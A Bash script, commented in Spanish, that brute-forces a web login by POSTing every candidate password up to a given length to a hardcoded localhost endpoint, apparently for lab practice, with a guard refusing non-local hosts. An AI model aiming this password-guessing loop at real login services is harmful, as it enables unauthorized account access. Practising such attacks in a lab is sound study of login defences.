#!/usr/bin/env bash
set -u
trap 'echo; exit 1' INT

usage() {
  cat <<EOF
Uso: $0 <usuario> <max_len> [alphabet] [print_every]
  usuario: usuario objetivo
  max_len: longitud máxima de contraseña a probar (entero)
  alphabet: digits | alpha | all  (por defecto: digits)
  print_every: imprimir estado cada N intentos (por defecto: 1000)
EOF
  exit 1
}

if [[ $# -lt 2 ]]; then
  usage
fi

USERNAME="$1"
MAX_LEN="$2"
ALPHA_CHOICE="${3:-digits}"
PRINT_EVERY="${4:-1000}"
TARGET="http://127.0.0.1:8000/login"

# seguridad: solo permitir localhost por defecto
host=$(echo "$TARGET" | sed -E 's|https?://([^/:]+).*|\1|')
if [[ "$host" != "127.0.0.1" && "$host" != "localhost" && "$host" != "::1" ]]; then
  echo "Target no permitido: $host"
  exit 2
fi

if ! command -v curl >/dev/null 2>&1; then
  echo "Se requiere curl"
  exit 3
fi

DIGITS="0123456789"
ALPHA_LOWER="abcdefghijklmnopqrstuvwxyz"
ALPHA_UPPER="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
SPECIALS='!#$%&/()=?¡¿+[];:.,'

case "$ALPHA_CHOICE" in
  digits) ALPHABET="$DIGITS" ;;
  alpha)  ALPHABET="${ALPHA_LOWER}${ALPHA_UPPER}" ;;
  all)    ALPHABET="${DIGITS}${ALPHA_LOWER}${ALPHA_UPPER}${SPECIALS}" ;;
  *) echo "Opción de alfabeto desconocida: $ALPHA_CHOICE"; usage ;;
esac

BASE=${#ALPHABET}
START_TIME=$(date +%s.%N)
ATTEMPTS=0

echo "Target: $TARGET"
echo "Usuario: $USERNAME"
echo "Long.max: $MAX_LEN"
echo "Tamaño alfabeto: $BASE"
echo "Imprime cada: $PRINT_EVERY intentos"
echo

CURL_OPTS=( -s -o /dev/null -w "%{http_code}" --connect-timeout 2 -m 6 )

for (( length=1; length<=MAX_LEN; length++ )); do
  declare -a INDEXES
  for (( i=0; i<length; i++ )); do
    INDEXES[i]=0
  done

  finished=0
  while [[ $finished -eq 0 ]]; do
    # construir candidato
    CAND=""
    for (( i=0; i<length; i++ )); do
      pos=${INDEXES[i]}
      CAND+="${ALPHABET:pos:1}"
    done

    ATTEMPTS=$((ATTEMPTS+1))

    # petición HTTP (silenciosa)
    HTTP_CODE=$(curl "${CURL_OPTS[@]}" -X POST -F "username=${USERNAME}" -F "password=${CAND}" "$TARGET" || echo "000")

    # imprimir solo cada N intentos para no saturar I/O
    if (( ATTEMPTS % PRINT_EVERY == 0 )); then
      echo "[$ATTEMPTS] último probado: '${CAND}' -> HTTP ${HTTP_CODE}"
    fi

    if [[ "$HTTP_CODE" == "200" ]]; then
      END_TIME=$(date +%s.%N)
      ELAPSED=$(awk -v s="$START_TIME" -v e="$END_TIME" 'BEGIN{printf "%.3f", e-s}')
      echo
      echo "FOUND: $CAND"
      echo "Intentos: $ATTEMPTS"
      echo "Tiempo: ${ELAPSED}s"
      exit 0
    fi

    # incremento de índice (como contador en base N)
    pos=$((length-1))
    carry=1
    while [[ $carry -eq 1 && $pos -ge 0 ]]; do
      if [[ ${INDEXES[$pos]} -lt $((BASE-1)) ]]; then
        INDEXES[$pos]=$(( INDEXES[$pos] + 1 ))
        carry=0
      else
        INDEXES[$pos]=0
        pos=$((pos-1))
      fi
    done

    if [[ $carry -eq 1 && $pos -lt 0 ]]; then
      finished=1
    fi
  done

  unset INDEXES
done

END_TIME=$(date +%s.%N)
ELAPSED=$(awk -v s="$START_TIME" -v e="$END_TIME" 'BEGIN{printf "%.3f", e-s}')
echo
echo "No encontrado en el espacio probado"
echo "Intentos totales: $ATTEMPTS"
echo "Tiempo total: ${ELAPSED}s"
exit 0